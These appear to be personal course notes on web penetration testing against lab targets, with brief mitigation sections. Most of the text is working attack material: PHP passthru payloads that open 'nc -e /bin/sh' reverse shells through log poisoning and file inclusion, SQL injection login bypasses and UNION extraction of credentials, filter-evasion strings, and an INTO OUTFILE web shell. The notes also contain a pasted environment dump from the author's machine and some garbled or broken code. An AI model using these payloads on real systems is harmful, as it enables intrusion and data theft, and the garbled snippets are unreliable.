+[mahesh@GS1-MAHESWAR-LX ~]$ cat /proc/self/environ                                                                     SHELL=/bin/bashHISTCONTROL=ignoredupsWSL_DISTRO_NAME=OracleLinux_9_1HISTSIZE=1000HOSTNAME=GS1-MAHESWAR-LXNAME=GS1-MAHESWAR-LXPWD=/home/maheshLOGNAME=maheshHOME=/home/maheshLANG=en_US.UTF-8LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=01;37;41:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;
+USER_AGENT=
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=01;36:*.au=01;36:*.flac=01;36:*.m4a=01;36:*.mid=01;36:*.midi=01;36:*.mka=01;36:*.mp3=01;36:*.mpc=01;36:*.ogg=01;36:*.ra=01;36:*.wav=01;36:*.oga=01;36:*.opus=01;36:*.spx=01;36:*.xspf=01;36:TERM=xterm-256colorLESSOPEN=||/usr/bin/lesspipe.sh %sUSER=maheshSHLVL=1WSLENV=which_declare=declare -fPATH=/home/mahesh/.local/bin:/home/mahesh/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/mnt/c/Program Files/WindowsApps/3810OracleAmericaInc.62074632F71C9_9.1.0.0_x64__dm28ctvqnhe9g:/mnt/c/Program Files/Zulu/zulu-17/bin/:/mnt/c/WINDOWS/system32:/mnt/c/WINDOWS:/mnt/c/WINDOWS/System32/Wbem:/mnt/c/WINDOWS/System32/WindowsPowerShell/v1.0/:/mnt/c/WINDOWS/System32/OpenSSH/:/mnt/c/Program Files/Zulu/zulu-8/bin/:/mnt/c/Program Files/nodejs/:/mnt/c/Program Files/Git/cmd:/mnt/c/Users/gs1-maheswarane/AppData/Local/Programs/Python/Python39/Scripts/:/mnt/c/Users/gs1-maheswarane/AppData/Local/Programs/Python/Python39/:/mnt/c/Users/gs1-maheswarane/AppData/Local/Microsoft/WindowsApps:/mnt/c/Users/gs1-maheswarane/AppData/Local/Programs/Microsoft VS Code/bin:/mnt/c/Users/gs1-maheswarane/AppData/Local/gitkraken/bin:/mnt/c/Local IS/apache-maven-3.6.2/bin:/mnt/c/Users/gs1-maheswarane/AppData/Local/JetBrains/PyCharm 2022.2.3/bin:/mnt/c/Local IS/apache-tomcat-8.5.78/bin:/mnt/c/Users/gs1-maheswarane/AppData/Roaming/npm:/mnt/c/Mahesh/Expeditors/Analysis/83_FixingThirdPartyJars_BookingUI/dependency-check/binMAIL=/var/spool/mail/maheshHOSTTYPE=x86_64BASH_FUNC_which%%=() {  ( alias;                                                            eval ${which_declare} ) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot $@          [mahesh@GS1-MAHESWAR-LX ~]$                                                                                             
+#####################
+
+2) Lets open this file in browser 
+eg: http:10/20.14.209/dvwa/vulnerbalities/fi?page=../../../../proc/self/environ 
+
+
+3) In /proc/self/environ , there will be 
+
+USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+
+-> Here user agent is the current browser used by the user 
+-> USER_AGENT is sent from the client, and which is modifiable 
+
+4) We will modify the USER_AGENT and will place code, which gives us the reverse shell  
+-> But before we do that, lets ensure that the code will be executed on the server 
+-> We will send a normal php code, that will display php information 
+
+5) In order to modify user_agent we will use burp proxy 
+-> In order to do: Local file inclusion vulnerability, lets modify this value : User-Agent and lets put the php code in it 
+-> To start with, lets put the code which displays the php information 
+
+
+Name: User-Agent 
+Value: <?phpinfo();?> 
+
+
+6) Upon changing the value for User-Agent and forwarding the request in burp proxy, we can see that the php code got executed on the target website
+-> This means that: if we send malicious code to this website, it will gain full access or we can get our code to be executed. 
+
+7) Now we will use passthru function to do reverse shell execution attack 
+
+
+----> Listen in port for 8888 connections in root@kali attacker machine.
+root@kali:~# nc -vv -l -p 8888 
+listening on [any] 8888 ....
+
+8) Now in browser, hit the below url: and modify the user_agent in burp proxy 
+
+http:10/20.14.209/dvwa/vulnerbalities/fi?page=../../../../proc/self/environ 
+
+EXPLOIT FOR user_agent 
+Exploit: 1 <?passthru("nc -e /bin/sh 10.20.14.208 8888"); ?>
+
+-> after forwarding the request in burp proxy, we will get a reverse shell connection using the local file inclusion vulnerability and we can we execute shell commands from our root@kali machine 
+
+
+root@kali:~# nc -vv -l -p 8888 
+listening on [any] 8888 ....
+10.20.14.209: inverse host lookup failed: unknown host 
+connect to [10.20.14.208] from (UNKNOWN) [10.20.14.209] 54461
+
+9) Now we can execute any commands through reverse shell execution 
+
+
+e) In this scenario, we are able to convert a local file inclusion vulnerability that can only show you files or only allow you to read files on the server 
+-> Then we are able to convert that and exploit it to get full access to the target server 
+
+f) This ie possible because we are able to write to the /proc/self/environ which displays our user agent.
+-> By changing user_agent to our php code, we are able to run any php code we want  
+
+
+30) Gaining Shell Access from LFI vulnerabilities - Method 2: 
+-> In this lesson we are going to see another method of exploiting local file inclusion vulnerabilities and gain full shell or full control over the target server 
+-> In previous video, we have seen how to do LFI using /proc/self/environ 
+-> In this lecture, we are going to do LFI using the logs ,If we manage to write anything to any of these files, then we can pretty much execute code 
+
+a) As part of this, we need to read any of the log files and find a way to interact with these logs files, so that we can write some stuff into it . 
+-> eg: if the log files that you are reading or interacting with mail log files - you can send an email with a code and then it will show up in the log file 
+
+b) In our example, we will use the /var/log/auth.log, which contains all the login attempts to the target server 
+
+http://10.20.14.210/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log 
+
+-> On hitting in the browser, we can see the logs getting printed which contains the login attempts to the target server
+
+c) Lets ssh and see the kali machine.
+
+root@kali~# ssh random@10.20.14.210
+random@10.20.14.210's password:
+Permission denied, please try again.
+random@10.20.14.210's password: 
+
+-> Now the server log will have the logs for the failed login also 
+ 
+d) Now the next step is : Try login again and instead of putting username as random, i will put the php code that we always used, to give a reverse shell connection on the server 
+
+1) Before running php code, lets put netcat and listen to the port 8888 for connections 
+
+root@kali:~# nc -vv -l -p 8888
+listening on [any] 8888 ....
+
+2) Try logging  again in another terminal of kali machine
+-> Instead of putting username, put two quotes and put the php code in between 
+-> While putting this php code, we should be careful because if the code has error in your code , file wont be displayed anymore 
+
+root@kali:~# ssh "<?passthru('nc -e /bin/sh 10.20.14.208 8888');?>"@10.20.14.210 
+
+-> since we have special characters -, spaces and /, we should encrypt the code using base64 and decrypt it at the other end 
+
+3) To encrypt and decrypt that command, we should copy the netcat command: 'nc -e /bin/sh 10.20.14.208 8888'
+
+4) Go to Burpsuite -> decoder and encode as base64:
+
+Before encoding:
+nc -e /bin/sh 10.20.14.208 8888
+
+After encoding:
+bmMgLWUgL2Jpbi9zaCAxMC4yMC4xNC4yMDggODg4OA==
+
+
+5) Now use the encoded netcat command in the passthru command:
+
+root@kali:~# ssh "<?passthru('bmMgLWUgL2Jpbi9zaCAxMC4yMC4xNC4yMDggODg4OA==');?>"@10.20.14.210 
+
+
+6) Running the passthru exactly like above wont run, we need to somehow tell that it is base64 code 
+-> We will be doing the same via php function base
+-> We need to again undertand that, all code we put here as php code is:substituted for username 
+
+root@kali:~# ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4yMC4xNC4yMDggODg4OA=='));?>"@10.20.14.210 
+
+
+7) On executing the code, it will ask password and on entering dummy values, this above code should have been injected in logs 
+
+8) Also we are listening in port 8888 in anothe kali terminal 
+
+root @kali:~# nc -vv -l -p 8888
+listening on [any] 8888 ....
+
+
+9) Now on entering the below url in browser:
+
+http://10.20.14.210/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log 
+
+10) On Entering the above url, we got a reverse shell  connection back from the  targetwebserver to the kali machine 
+
+root @kali:~# nc -vv -l -p 8888
+listening on [any] 8888 ....
+10.20.14.210: inverse host lookup failed: unknown host 
+connect to [10.20.14.208] from (UNKNOWN)[10.20.14.210]
+
+
+e) Thus we saw another method of exploiting : local file inclusion vulnerabilities to get a shell on the target machine. 
+
+-> depending on type of log we should send the exploit 
+
+f) for eg: mail.log we need to send as mail and 
+           auth.log we need to send as ssh 
+           
+31) Remote File Inclusion vulnerabilities:
+
+
+● Similar to local file inclusion 
+● But allows an attacker read any file from any server 
+● Execute php files from other servers on the current server 
+● Store php files on other servers as .txt 
+
+
+
+a) It is a special case of file inclusion vulnerabilities
+b) In this lesson if the server is configured to allow a certain function called: allowUrlifopen, then we will be able to include any file from computer into the target 
+-> Thus we will be able to included ay php file into the target
+-> Using this, we can run payloads, reverse shells , even system commands and get access to target and get full control of target server 
+
+c) In dvwa app, we will use the File Inclusion vulnerability, we used in previous video 
+d) In this scenario, we need to enable the function that converts local file inclusion to a remote file inclusion
+
+e) To enable the function, we need to go to the metasploitable machine  -> PHP settings 
+
+-> PHP settings are stored in a file :
+/etc/php5/cgi/php.ini
+
+-> In php.ini the php configuration is stored 
+
+f) We need to open the file as sudo :
+
+nfsadmin@metasploitable:/root$ sudo nano /etc/php5/cgi/php.ini 
+
+
+-> In kali we dont need sudo since we login as root,but in metasploitable we login as nfsadmin 
+
+
+g) Upon opening php.ini , we need to look into the function 
+allow_url_fopen =  On
+allow_url_include = On 
+
+
+-> If these two functions are enabled, then the local file inclusion vulnerability that we have can be used as a remote file inclusion vulnerability
+
+h) After doing this, restart the webserver :
+
+nfsadmin@metasploitable:/root$ sudo /etc/init.d/apache2 restart 
+* Restarting web server apache2 
+
+-> THus we restarted webserver 
+
+i) As we are going to access file on a different server 
+
+-> if we are doing this pentest in an actual webserver, then we need to store the file that you want to access in  a place with real ip address or domain name.
+-> We will do this in a local server, Hence going to start it on the webserver(i.e kali machine 10.20.14.203) 
+
+1) create a php file and put commands in the passthru  which could do  reverse shell execution: 
+
+<?php
+nc -e /bin/sh 10.20.14.203 8888");
+passthru("");
+
+?>
+
+2) Next step is to store this file in a location, where you can access it from the webserver 
+-> We will try to access this from my metasploitable machine, which is able to access files stored on the kali machine because they both are on the same network 
+3) We will store the file as txt and not as php 
+4) in netcat listen to port 8080 
+
+root@kali:~# nc --vv -l -p 8080
+listening on [any] port 8080
+
+5) In the browser, instead of including file in same server, we will include remote file and we will use http command 
+
+
+10.20.14.203/dvwa/vulnerabilities/fi?page=http://10.20.14.203/reverse.txt
+
+-> We need to ensure that the remote file is accessible by our target 
+-> Also ensure file is stored as .txt , because if we keep it as php , the reverse shell will be executed on the remote server i.e it will get executed in .203 instead of being executed on (.204) 
+
+-> In some casese, we may need to add ? at the end , to get this file to be executed as php 
+
+
+6) Now upon hitting in browser, we will be able to execute the reverse shell commands in kali machine where we are listening in port 8080
+
+
+32) Remote file inclusion with medium security:
+
+a) In dvwa we will mark security as medium and use exact same way to getinto the shell 
+b) We will use a text file which contains code for the reverse connection 
+
+10.20.14.209/dvwa/vulnerabilities/fi?page=http://10.20.14.208/reverse.txt 
+
+c) Also we are listening in kali machine 
+root@kali:~#nc -vv -l -p 8080 
+Listening on [any] 8080...
+
+
+d) Now on hitting url in browser, we could not see anything at kali machine and we could see and error thrown in browser 
+-> Reason may be some filtering is employed in the dvwa application 
+
+e) Now lets change url to: text 'http' changed to "hTTp" and enter the url in browser
+
+
+10.20.14.209/dvwa/vulnerabilities/fi?page=http://10.20.14.208/reverse.txt 
+
+
+f) Now we can see the connections got received in kali machine and we are able to execute the commands 
+
+
+g) This way of attack is possible, because this way of securing via filtering is not correct 
+
+
+33) MITIGATION OF FILE INCLUSION VULNERABILITIES: 
+a) Prevent remove file inclusion 
+---> Disable allow_url_fopen and allow_url_include
+1) go to nsfadmin@metasploitable and edit /etc/php5/cgi/php.ini file 
+
+-> Change allow_url_fopen and allow_url_include to off 
+
+eg:
+
+allow_url_fopen=off
+allow_url_include=off 
+
+b) 
+Other way to Prevent local file inclusion is to use Static file inclusion 
+-> Use static file inclusion 
+
+---> check for the file name directly in code 
+
+1) We can hardcode the files that we want to include in the code and not get them using get or post 
+
+-> Until now what happened:
+for ex: We have a page called: index.php and this page index.php takes a parameter called page 
+
+
+3) 
+index.php?page=news.php 
+
+code:index.php 
+include(GET['page']) ; 
+
+
+c) Now if we hit the url in browser: 10.20.14.209/devwa/vulnerabilities/fi?page=include.php
+
+d) We wont be able to see the page, because as part of static file inclusion we have harcoded the code for the file 
+
+
+34) SQL injection vulnerabilities: DANGERS
+a) They are everywhere 
+b) Gives access to sensitive database data 
+c) can be used to read local files outside www root 
+d) can be used to login as admin and further exploit the system 
+e) Can be used to upload files 
+
+
+35) Discovering SQL injections in POST: 
+a) To try and discover sql injections, you need to browser through your target and try to break each page
+-> So whenever you see a text box or a parameter on this form, for example page.php 
+
+http://target.com/page.php?something=something
+
+1) Try to break the page using  'and', 'order by' or "'" 
+2) Test text boxes and url parameters on the form:
+
+http://target.com/page.php?something=something 
+
+b) 
+
+
+Exploit: 2 
+select * from accounts where username = 'zaid' and password='123456' or 1=1#'
+
+
+
+36) By passing login 1:
+-> by using or 1=1#'
+
+Exploit: 2 
+select * from accounts where username = 'zaid' and password='123456' or 1=1#'
+
+
+37) By passing login 2: 
+-> by usin #' after username
+
+Exploit: 3
+select * from accounts where username = 'admin' #' and password ='anything'
+
+
+
+38) By passing login 3: 
+
+a) During SQL injection,filtering can happen at client side or at server side 
+b) If filtering happens at client side, then it is easy to bypass it using burp proxy 
+-> Burpsuite also helps us identify whether it is happening at client side or at server side 
+
+39) Preventing SQL injections in login pages: 
+
+
+WARNING: UNCLEAR , NEED A RETAKE 
+
+.........................................
+query: 
+SELECT * FROM ACCOUNTS WHERE USERNAME='admin',
+or 1=1 #' AND password='",$password 
+
+
+
+SELECT * FROM accounts  WHERE username='",
+$conn->real_escape_string($username),
+"' AND password='",
+$conn->real_escape_string($password),"'"; 
+
+
+
+real_escape_string -> removes new line, break characters, quotations etc
+-> whatever we inject in the conn area is not considered as code and only will be considered as string 
+
+.........................................
+
+
+
+40) Discovering SQL Injections in GET
+
+a) KNOWN WAY OF FINDING THE EXPLOITS 
+
+1) 10.2014.204/multillidae/index.php?page=user-info.php&username=zaid&password=12345&user-info.php-submit-button=View+Account+Details
+
+
+-> if we see url like this and in that case we can try inject stuff in here: username=zaid
+-> We have already seen a way of injection using quotation mark and using the And
+---> We do a false AND and a true AND 
+ true AND 1=1 
+ false AND 1=2
+ 
+ 
+ 2) If the server executes what we want, then we can conclude that there is an SQL injection  
+ 
+---> We do a false AND and a true AND 
+
+
+b) Another WAY OF DISCOVERING EXPLOITS: using ORDER BY 1
+
+1) As the name suggests ORDER BY is used to order the results based on a specific column 
+
+c) order by 1 
+-> means i want to order the results based on the first column 
+---> Hence this should always be acceptable by db and return a true or something we expect 
+
+SELECT * FROM accounts where username = 'zaid' order by 1#' and password = '$PASSWORD'
+
+
+D) ORDER BY 10000000
+-> Here it means order the results based on 10000000th column. Since there wont be 10000000 columns, hence we will get an error when we execute it 
+
+
+41) Reading Database information 
+a) Lets determine how many columns are being selected into this page 
+
+-> We can determine the number of columns by using orderby and increasing the number until it returns an error 
+
+
+
+b) Another way of selecting multiple stuff 
+
+select * from accounts, where username ='zaid' order by 1#' and password = '$PASSWORD'
+union select 1,2,3,4,5  
+
+-> In case there are 5 columns , we can use union to render to 5 columns 
+
+
+OUTPUT:
+
+Username=zaid 
+Password=123456
+Signature=aa
+
+Username=2
+Password=3
+Signature=4 
+
+
+c) Gettin db details :
+
+
+select * from accounts, where username ='zaid' order by 1#' and password = '$PASSWORD'
+
+union select 1,database(),user(),version(),5 
+
+
+OUTPUT:
+
+Username=zaid 
+Password=123456
+Signature=aa
+
+Username=owasp10
+Password=root@localhost
+Signature=5.0.51a-3-ubuntu5 
+ 
+ 
+ 42) Finding database tables:
+ -> We found that our target db is owasp10, now lets discover the tables that exist in that DB 
+ 
+a) information_schema is a default database created by mysql and it contains information about all other databases 
+
+
+
+select * from accounts, where username ='zaid' order by 1#' and password = '$PASSWORD'
+
+union select 1,table_name,null,null,5  from information_schema.tables
+
+
+
+Output:Results for , 237 records found 
+
+
+Username=zaid 
+Password=123456
+Signature=aa
+
+Username=CHARACTER_SETS
+Password=
+Signature=
+
+Username=COLLATIONS 
+Password=
+Signature=
+
+.....
+
+
+---> In these 237 records, we can see all the tables that we have 
+
+
+b) Now adding a where clause to fetch result for table owasp10 
+
+Query: 
+
+select * from accounts, where username ='zaid' order by 1#' and password = '$PASSWORD'
+
+union select 1,table_name,null,null,5  from information_schema.tables where table_schema = 'owasp10'
+
+43) Extracting sensitive information such as passwords 
+
+a) Reading the information from table called Account in database 'owasp10' 
+
+b) HOW TO SELECT COLUMNS FOR A certain table: 
+
+
+Query: 
+
+select * from accounts, where username ='zaid' order by 1#' and password = '$PASSWORD'
+
+union select 1,column_name,null,null,5  from information_schema.tables where table_schema = 'owasp10'
+
+-> From earlier query change table_name with column_name 
+-> change from information_schema.tables to information_schema.columns 
+-> change from table_schema to table_name and 
+name of table to 'accounts' 
+
+Query: 
+
+select * from accounts, where username ='zaid' order by 1#' and password = '$PASSWORD'
+
+union select 1,column_name,null,null,5  from information_schema.columns where table_name = 'accounts'
+
+
+---> THis query will SHOW ALL COLUMNS FROM ACCOUNTS TABLE 
+
+
+44) Discovering and exploiting blind sql injections 
+
+-> A Blind sql injection is one that does not display any errors to you 
+
+a) In blind sql injection , we check for the existence through
+1)  a true and false statement 
+2) see if the page behavs according to the statements given 
+3) If a true statement is given, it gives a valid page 
+4) If a false statement is given, it gives an invalid page 
+
+
+45) Bypassing filters: 
+a) Two main statements that are used to discover sql statements are : a) AND Statement b) Order by statement 
+b) Some website implement security by checking the query url for a number of words: 
+-> They blacklist these words if they exist and they dont execute the query 
+----> Those words incldue: AND, OR , UNION , SELECT 
+c) We have already seen how we can bypass client side security or filtering using burp suite  
+d) If blacklist of words is used, then we can use techniques like below to bypass filtering 
+
+e) use capital words :
+
+eg:
+Exploit: 4
+and 1=1
+aNd 222=222
+anD 111=111
+orDer bY 1 
+
+-> By doing this, query will pass even if the target website has blacklisted words 
+
+f) Websites also blacklist the space, so they dont allow spaces in the URL 
+
+Exploit: 5
+-> By pass space by using plus (+) or a double comment //  instead of a space 
+
+Our Exploit Earlier:
+union select 1,2 %23 
+
+Our Exploit currently: by adding space 
+uNioN+sEleCt+1,2+%23 
+
+or 
+
+uNioN/**/sEleCt/**/1,2/**/%23
+
+
+g) Above statements will be exploited like normal statements 
+-> thus our query will get executed, even if the words are blacklisted 
+
+
+46) Bypassing Security and accessing all records 
+
+a) In this lesson, we will see a case which we encounter in 50% of the websites where zaid has faced during penetration testing 
+b) Lets run the Exploit which we were already using :
+-> This exploit lists all the tables present in the db 
+
+Exploit: 6 
+1'+uNioN/**/sEleCt/**table_name,2+fRom+information_schema.tables%23&Submit=Submit# 
+
+c) Sometimes application code is written in such a manner to return only one record
+-> even though our sql query is written to return multiple records 
+
+d) In those situations, we can use 'where' statement to show database tables within your current database 
+
+e) Now we will see, how it helps to iterate over all the tables 
+-> We will use 'limit' keyword to specify which record we want to display with the current statement 
+-> by this way, we will be able to iterate 
+ over the records one by one and display all of them 
+ 
+ 
+Exploit: 7 
+1'+uNioN/**/sEleCt/**table_name,2+fRom+information_schema.tables+limit+0,1%23&Submit=Submit# 
+
+-> Here limit takes two values 
+--> First: location of record that we want to start displaying records from , in our example it is 0, since we want to display from first record 
+--> Second: number of records we want to display on screen starting witht the value we specified here 
+ ---->since we know that the dvwa page is limited to show only one record at a time, the second value for limit can only be 1 in this case 
+ 
+ -> so using the above exploit,we can get the desired record by modifying the exploit's limit parameters 
+ 
+ 
+f) ENHANCING THE STATEMENT WITH WHERE CLAUSE
+-> In where clause, we can speciy where table_schema is eqal to 'schema name' we want  
+
+ 
+Exploit: 7 
+1'+uNioN/**/sEleCt/**table_name,2+fRom+information_schema.tables+where table_schema='dvwa'+limit+0,1%23&Submit=Submit# 
+
+
+THUS WE BYPASSED THE APPLICATION SECURITY WHICH WAS IMPLEMENTED TO DISPLAY ONLY ONE VALUE AT A TIME 
+
+
+47) Quick fix to prevent sql injections: 
+-> In this lesson, we will see high level security in application and see why it is not injectable 
+
+Medium security sql select statement:
+$getid = "SELECT first_name, last_name from users where user_id=$id";
+$result= mysql_query($getid) 
+
+
+High security sql select statement:
+$getid = "SELECT first_name, last_name from users where user_id=$id";
+$result= mysql_query($getid) 
+
+
+a)  Comparing medium security and high security code, we can see that they use same function to skip special characters, but it is implemented in the right way for high security 
+MEDIUM SECURITY CODE 
+1)In medium security we can see that 'id' is read using GET 
+
+   $id = $GET['id'];
+2) Then they use a function: mysql_real_escape_string which goes through every character in the 'id' variable, look for special characters such as double and single quotes and remove them 
+
+  $id = mysql_real_escape_string($id); 
+  
+3) Then if we go to the SQL statement, we dont need to use any quotes to inject code into this statement.  i.e inside the ID variable 
+-> instead we have to put any ID like 1 and put the union statement: "union select column name,2 from information_schema.columns where table_name ='users' 
+-> This will be readby database and executed. 
+
+$getid = "SELECT first name, last name FROM users WHERE USER_ID = $id"; 
+   
+
+4) We dont need to use quotes again because the code does not use any single quote
+
+
+HIGH SECURITY CODE:
+1)  In high security code, it uses the same function to skip special characters, but it is implemented in the right way 
+-> The right way is to have single quotes in the satement around the ID 
+
+
+
+$id = $GET['id']
+$id = stripslashes($id);
+$id = mysql_real_escape_string($id); 
+
+if(is_numeric($id)){
+
+$getid = "SELECT first_name, last_name FROM users WHERE user_id ='$id'"; 
+
+}
+
+3) Therefore since the code is skipping the quotes we put, and because they are using codes in sql, anycode that we try to inject will be considered as if it is part of the ID , then it will be insersted as part of id variable betwen the two single quotes and it will be considered as only the id 
+-> while if we inject same exploit in medium security it will be executed as part of the sql statement 
+
+
+b) Lets compare the sql statements in medium and high security level 
+
+MEDIUM
+$getid = "SELECT first name, last name FROM users WHERE USER_ID = $id"; 
+
+1) When we try to inject the exploit  '1 and 1=1'
+-> This is because if we can inject above exploit, we can inject anything we can and get it executed on the database 
+2) This exploit will be placed instead of $id and it will pass through the mysql_real_escape_string  and the code will look like this:
+Exploit: 8
+$getid = "SELECT first name, last name FROM users WHERE USER_ID = 1 and 1=1; 
+
+
+HIGH
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; 
+1) Here with single change of use of single quotes , the query will be changed like this 
+
+$getid = "SELECT first_name, last_name FROM users WHERE user_id ='1 and 1=1'"; 
+
+2) Here 'and 1=1' will not be considered as part of the sql statement, but it will be considered as part of the user id  
+
+48) Reading and writing files on the server using SQL Injections 
+READING FILE CONTENTS FROM SERVER 
+a) In this lesson we will see , how we can use sQL injections to read any file in the server 
+i.e even if the file exists outside the www root, we will be able to read it like a file disclosure vulnerability 
+b) We will also see how we can use it to write files and upload them to the system, just like a file upload vulnerability 
+c) First we will look at reading the file 
+-> Here we will use the load_file function and in the function we specify the file we want to load 
+
+
+
+Exploit: 9
+union select null, load_file('etc/passwd'),null, null, null 
+
+
+#####load_file()##########
+MySQL LOAD_FILE() reads the file and returns the file contents as a string.
+
+
+##################################
+
+
+d) we will use the above exploit in the url 
+eg:
+10.20.14.204/multillidae/index.php?page=user-info.php&username=admin'union select null,load_file('etc/passwd'),null,null,null %23&password=adminpass&user-infor.php 
+
+e) On entering above url in browser, we will get the file output in browser window 
+
+-> Thus we are able to read file contents from the sql server 
+
+
+WRITING FILE CONTENTS TO SERVER:
+f) This is very useful because we will be able to write contents or load virus into the server 
+-> Thus this vulnerability looks like a file upload vulnerability 
+
+1) To do that we will use a function called:
+
+
+Exploit: 10 
+union select null, 'example example' null, null, null into outfile '/var/www' 
+
+#####outfile########
+
+SELECT INTO OUTFILE writes the resulting rows to a file
+
+eg:
+SELECT customer_id, firstname, surname from customer
+  INTO OUTFILE '/exportdata/customers.txt'
+
+#################
+
+#######into statement in sql#########
+The SQL SELECT INTO Statement
+The SELECT INTO statement copies data from one table into a new table.
+
+syntax:
+SELECT *
+INTO newtable [IN externaldb]
+FROM oldtable
+WHERE condition;
+
+
+#######################################
+
+
+49) Getting a  shell and controlling the target server using an SQL injection 
+-> In previous lesson we saw how we can write stuff to the server using sql injection  using the into outfile function
+-> And if the server allows us to write to the web directory where we can browse, then we can write our reverse shell program using the same code which we have done before 
+
+a) The problem here is we were not able to write stuff to the web directory , hence we cant read the stuff using the url 
+b) Only place that we could write was the tmp, so you cant browse the tmp through the url hence we cant browse that file also
+c) We will look at a workaround for this problem, but the only requirement is that the server which we are going to exploit should have a local file inclusion  
+d) Here in below exploit we will be using the php code for reverse shell execution 
+-> here this code: 'nc -e /bin/sh 10.20.14.208 8080' will try to connect to the IP specifyid using netcat 
+
+Exploit: 11 
+union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'
+
+Exploit in browser url:
+10.20.14.211/dvwa/vulnerabilities/sqli?id=1'union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php' 
+
+-> On executing above url, we get output : "File 'tmp/reverse.php' already exists" 
+
+e) Now we will go to the server; 10.20.14.208 and listen to any connections to port:8080 
+
+eg:
+root@kali:~#nc -vv -l -p 8080 
+listening on [any] 8080 ... 
+
+
+f) Thus far, we have the file written through browser exploit and we are listening to connections in port 8080 
+-> Now all we need is a way to browse this file to get it executed 
+
+g) In order to do this, we need to find a website in the same server which has local file inclusion vulnerability 
+-> in the website that has vulnerability access url: 10.20.14.21/dvwa/vulnerabilities/fi?page=../../../../tmp/reverse.php 
+
+h) On hitting the url , we get a reverse shell connection on the server we are listening :
+
+eg:
+root@kali:~#nc -vv -l -p 8080 
+listening on [any] 8080 ... 
+connect to [10.20.14.208] from (UNKNOWN) [10.20.14.211] 51039 
+pwd 
+/var/www/dvwa/vulnerabilities/fi
+ls
+help 
+include.php 
+index.php 
+source 
+id 
+uid=33(www.data) gid=33(www.data) groups=33(www.data) 
+sent 10, rcvd 121 
+
+
+50) Discovering SQL injections and Extracting Data using SQLmap 
+-> Until now we are exploiting sql injections manually, by injecting the code into the URL or into the text boxes 
+-> In this lesson, we will use a tool sqlmap which helps to 
+a) SQLMap
+-> Tool designed to exploit sql injections 
+-> Works with many db types, mysql ,mssq, Oracle.. etc 
+-> Can be used to perform everything we learned and more 
+
+---> commands: 
+> sqlmap --help
+> sqlmap -u[target url]
+
+b) Tool is very handy when:
+-> Sometimes we get only one output for each record and we may need to loop through all the outputs
+-> We can use the tool to automate that and do everything for an sql injection 
+
+c) SQL Map usage:
+
+sqlmap -u "http://10.20.14.204/multillidae/index.php?page=user.info.php&username=admin&password=aaas&user-info.php-submit.button=View+Account+Details"
+
+d) SQL Map also helps to get following information on DB:
+-> --dbms for database information 
+-> --dbs to list available dbs 
+-> --currentuser 
+-> --current-db 
+-> --tables -D databaseName 
+-> --columns 
+
+
+51) Getting a Direct SQL shell using SQLmap 
+a) SQLMap also allows to get different types of shells on the target server, so you can actually 
+
+52) Right way to filter SQL injection vulnerabilities:
+a) Filters can be used to prevent sql vulnerabilities
+-> But still filters can be bypassed 
+b) Use blacklist commands 
+-> Still can be bypassed 
+c) Using Whitelist 
+-> Still can be bypassed 
+
+BEST WAY:
+To program web application in a way that it does not allow code to be injected into it and then execute it 
+-> It can be done using parameterized statements, separate data from sql code 
+
+eg:
+PROBLEMATIC CODE 
+
+<?php 
+//$testbox1= admin' union select #
+
+select * from accounts where username='admin' union select #'
+
+
+SAFE WAY :using parameterized code 
+->prepare("select * from accounts where username= ?")
+->execute(array('$textbox1")) 
+
+
+53) Introduction - What is XSS - Cross Site Scripting 
+a) XSS allows an attacker to inject javascript code into the page 
+b) Code is executed when the page loads 
+c) Code is executed on the client machine not the server 
+
+d) Three main types 
+
+1) Persistent/Stored XSS 
+-> gets stored in the database or in the page 
+-> So everytime the user hits that page, your xss code will be executed. 
+
+2) Reflected XSS 
